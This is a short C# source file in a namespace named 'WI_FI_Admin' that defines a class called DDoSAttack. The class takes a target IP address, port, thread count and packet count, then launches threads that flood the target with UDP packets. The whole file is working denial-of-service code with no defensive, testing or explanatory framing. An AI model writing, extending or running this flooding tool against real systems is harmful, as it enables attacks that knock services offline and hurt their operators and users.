using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace WI_FI_Admin
{
  

    public class DDoSAttack
    {
        private string targetIP;
        private int targetPort;
        private int threads;
        private int packets;

        public DDoSAttack(string targetIP, int targetPort, int threads, int packets)
        {
            this.targetIP = targetIP;
            this.targetPort = targetPort;
            this.threads = threads;
            this.packets = packets;
        }

        public void StartAttack()
        {
            for (int i = 0; i < threads; i++)
            {
                Thread thread = new Thread(new ThreadStart(Attack));
                thread.Start();
            }
        }

        private void Attack()
        {
            for (int i = 0; i < packets; i++)
            {
                try
                {
                    UdpClient client = new UdpClient();
                    client.Connect(targetIP, targetPort);
                    byte[] data = Encoding.ASCII.GetBytes("X" + i);
                    client.Send(data, data.Length);
                    client.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }
    }
}